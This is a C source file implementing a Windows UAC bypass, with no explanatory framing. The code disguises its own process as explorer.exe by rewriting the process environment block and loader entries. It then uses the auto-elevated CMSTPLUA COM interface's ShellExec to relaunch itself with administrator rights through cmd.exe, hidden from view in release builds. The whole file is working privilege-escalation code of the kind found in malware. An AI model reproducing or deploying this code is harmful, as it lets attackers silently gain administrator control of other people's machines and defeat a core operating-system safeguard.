#include "uac.h"
#include "debug.h"
#include "util.h"

#define PROCESS_TO_MASQUERADE	L"explorer.exe"
#define CMD_PATH				L"System32\\cmd.exe"

static wchar_t g_currentExecutable[MAX_PATH];
static wchar_t g_cmdPath[MAX_PATH];

static NTSTATUS ucmDccwCOMMethod()
{
	NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
	HRESULT r = E_FAIL;
	BOOL bApprove = FALSE;
	ICMLuaUtil* CMLuaUtil = NULL;
	
#ifdef DEBUG
	ULONG show = SW_SHOW;
#else
	ULONG show = SW_HIDE;
#endif
	
	HRESULT hInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	do {

		r = ucmAllocateElevatedObject(
			T_CLSID_CMSTPLUA,
			&IID_ICMLuaUtil,
			CLSCTX_LOCAL_SERVER,
			(PVOID*)&CMLuaUtil);
		
		if (r != S_OK)
			break;
		if (!CMLuaUtil)
		{
			r = E_OUTOFMEMORY;
			break;
		}
		
		r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
			g_cmdPath,
			g_currentExecutable,
			NULL,
			SEE_MASK_DEFAULT,
			show);
		
		if (SUCCEEDED(r))
			MethodResult = STATUS_SUCCESS;

	} while (FALSE);

	if (CMLuaUtil)
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	if (hInit == S_OK)
		CoUninitialize();

	return MethodResult;
}

BOOL getAdmin()
{
	HANDLE hProcess = GetCurrentProcess();
	BOOL status = FALSE;
	
	HMODULE hNtdll = GetModuleHandleW(NTDLL_DLL_NAME);
	if (!hNtdll)
		return FALSE;
	pRtlEnterCriticalSection _RtlEnterCriticalSection = (pRtlEnterCriticalSection)GetProcAddress(hNtdll, "RtlEnterCriticalSection");
	if (!_RtlEnterCriticalSection)
		goto cleanup;
	pRtlLeaveCriticalSection _RtlLeaveCriticalSection = (pRtlLeaveCriticalSection)GetProcAddress(hNtdll, "RtlLeaveCriticalSection");
	if (!_RtlLeaveCriticalSection)
		goto cleanup;

	// Get explorer.exe's file path
	wchar_t buffer[MAX_PATH];
	UINT size = GetWindowsDirectoryW(buffer, MAX_PATH);
	if (!size)
		goto cleanup;
	
	wsprintfW(g_cmdPath, L"%ls\\%ls", buffer, CMD_PATH);
	wsprintfW(buffer + size, L"\\%ls", PROCESS_TO_MASQUERADE);
	
	// Get PEB
	FPEB* peb = getPeb();
	if (!peb)
		goto cleanup;
	
	// Masquerade the process
	_RtlEnterCriticalSection(peb->FastPebLock);
	wsprintfW(g_currentExecutable, L"/c %ls", peb->ProcessParameters->ImagePathName.Buffer);
	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, buffer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, PROCESS_TO_MASQUERADE);
	
	BOOL entryFound = FALSE;
	LIST_ENTRY* listHead = &peb->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* listEntry = listHead->Flink;
	while (listHead != listEntry)
	{
		FLDR_DATA_TABLE_ENTRY* entry = (FLDR_DATA_TABLE_ENTRY*)((BYTE*)listEntry - sizeof(LIST_ENTRY));
		if (peb->ImageBaseAddress == entry->DllBase)
		{
			entryFound = TRUE;
			RtlInitUnicodeString(&entry->FullDllName, buffer);
			RtlInitUnicodeString(&entry->BaseDllName, PROCESS_TO_MASQUERADE);
			
			break;
		}
		
		listEntry = listEntry->Flink;
	}
	
	_RtlLeaveCriticalSection(peb->FastPebLock);
	if (!entryFound)
		goto cleanup;
	
	// UAC Bypass
	status = ucmDccwCOMMethod() == STATUS_SUCCESS;
	
cleanup:
	FreeLibrary(hNtdll);
	return status;
}